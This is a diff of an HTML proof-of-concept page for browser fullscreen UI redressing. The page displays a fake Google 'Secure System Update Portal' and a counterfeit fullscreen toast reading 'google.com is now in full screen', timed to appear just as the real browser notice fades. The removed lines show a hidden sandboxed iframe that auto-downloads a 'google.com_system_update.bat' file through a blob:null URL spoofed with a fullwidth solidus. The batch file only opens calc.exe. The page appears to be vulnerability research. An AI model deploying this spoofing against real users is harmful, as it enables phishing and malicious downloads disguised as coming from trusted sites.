@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC: Advanced Fullscreen UI Redressing & Download Bypass</title>
+<title>PoC: Fullscreen Origin UI Redressing</title>
 <style>
   body {
     margin: 0;
@@ -11,7 +11,7 @@
     background: #f8f9fa;
     font-family: system-ui, -apple-system, sans-serif;
     color: #1a1a1a;
-    overflow: hidden; /* Prevent scroll during fullscreen */
+    overflow: hidden;
   }
 
   .container {
@@ -57,16 +57,13 @@
     background: #1557b0;
   }
 
-  /* 
-   * MIND-BLOWING PART: Fake Browser Fullscreen Notification 
-   * Designed to pixel-match Chrome/Edge default fullscreen toast
-   */
+  /* Fake Browser Fullscreen Notification — Text Only */
   #fake-fullscreen-toast {
     position: fixed;
     top: 20px;
     left: 50%;
     transform: translateX(-50%);
-    background: rgba(32, 33, 36, 0.95); /* Chrome dark theme toast */
+    background: rgba(32, 33, 36, 0.95);
     color: #e8eaed;
     padding: 12px 24px;
     border-radius: 8px;
@@ -78,20 +75,14 @@
     pointer-events: none;
     transition: opacity 0.5s ease-in-out;
     z-index: 999999;
-    display: flex;
-    align-items: center;
-    gap: 10px;
+    white-space: nowrap;
   }
 
   #fake-fullscreen-toast.visible {
     opacity: 1;
   }
 
-  #fake-fullscreen-toast .icon {
-    font-size: 16px;
-  }
-
-  /* Fake background content to make it look legitimate */
+  /* Fake Content View */
   .fake-content {
     display: none;
     flex-direction: column;
@@ -100,7 +91,7 @@
     height: 100vh;
     background: #ffffff;
   }
-  
+
   .fake-content.active {
     display: flex;
   }
@@ -111,23 +102,24 @@
   <!-- Initial View -->
   <div class="container" id="initial-view">
     <div class="title">
-      Advanced PoC: Fullscreen UI Redressing + <code>blob:null</code> Download Attribution Bypass
+      PoC: Fullscreen Origin UI Redressing via <code>blob:null</code> + Fullwidth Solidus
     </div>
     <button class="trigger-btn" onclick="initiateAttackSequence()">
-      Verify System & Enter Fullscreen
+      Enter Fullscreen
     </button>
   </div>
 
   <!-- Fake Content View (Shown after fullscreen) -->
   <div class="fake-content" id="fake-view">
-    <h1 style="color: #4285f4; font-size: 3rem; margin-bottom: 10px;">G<span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></h1>
+    <h1 style="color: #4285f4; font-size: 3rem; margin-bottom: 10px;">
+      G<span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>
+    </h1>
     <p style="color: #5f6368;">Secure System Update Portal</p>
   </div>
 
-  <!-- The Fake Browser Toast Notification -->
+  <!-- Fake Browser Toast Notification (Text Only) -->
   <div id="fake-fullscreen-toast">
-    <span class="icon">🔒</span>
-    <span>google.com is now in full screen. Press Esc to exit.</span>
+    google.com is now in full screen. Press Esc to exit.
   </div>
 
   <script>
@@ -140,17 +132,14 @@
         elem.webkitRequestFullscreen();
       }
 
-      // 2. Execute Background Payload (Blob Null + Fullwidth Solidus)
-      executeDownloadPayload();
-
-      // 3. UI Redressing Sequence
+      // 2. UI Redressing Sequence
       setTimeout(() => {
         // Hide initial view, show fake legitimate content
         document.getElementById('initial-view').style.display = 'none';
         document.getElementById('fake-view').classList.add('active');
-        
-        // The real browser toast fades out around 2.5 - 3 seconds.
-        // We fade IN our fake toast right after to create seamless illusion.
+
+        // Real browser toast fades out around 2.5-3 seconds.
+        // Fade IN our fake toast right after for seamless illusion.
         setTimeout(() => {
           document.getElementById('fake-fullscreen-toast').classList.add('visible');
         }, 2500);
@@ -158,50 +147,7 @@
       }, 500);
     }
 
-    function executeDownloadPayload() {
-      // Create sandboxed iframe for opaque origin
-      const iframe = document.createElement('iframe');
-      iframe.sandbox = 'allow-scripts allow-downloads'; 
-      iframe.style.display = 'none'; 
-      document.body.appendChild(iframe);
-
-      const iframeHTML = `
-        <!DOCTYPE html>
-        <html><body><script>
-          const batLines = [
-            '@echo off',
-            'title Trusted Domain System Updater',
-            'echo Initializing secure update sequence...',
-            'timeout /t 2 >nul',
-            'echo Verifying system integrity...',
-            'start "" "C:\\\\Windows\\\\System32\\\\calc.exe"',
-            'echo Update applied successfully.',
-            'pause'
-          ];
-          const batContent = batLines.join('\\r\\n');
-
-          const blob = new Blob([batContent], { type: "application/octet-stream" });
-          const realUrl = URL.createObjectURL(blob);
-          const uuid = realUrl.split("/").pop();
-
-          // Fullwidth Solidus Spoofing: %EF%BC%8F is '／' (U+FF0F)
-          const spoofedUrl = \`blob:null/\${uuid}#%EF%BC%8Fgoogle.com\`;
-          const filename = "google.com_system_update.bat";
-
-          const a = document.createElement("a");
-          a.href = spoofedUrl;
-          a.download = filename;
-          document.body.appendChild(a);
-          a.click();
-
-          setTimeout(() => { a.remove(); URL.revokeObjectURL(realUrl); }, 1000);
-        <\/script></body></html>
-      `;
-      
-      iframe.srcdoc = iframeHTML;
-    }
-
-    // Exit fullscreen handler to clean up fake toast
+    // Exit fullscreen handler — clean up fake toast
     document.addEventListener('fullscreenchange', () => {
       if (!document.fullscreenElement) {
         document.getElementById('fake-fullscreen-toast').classList.remove('visible');
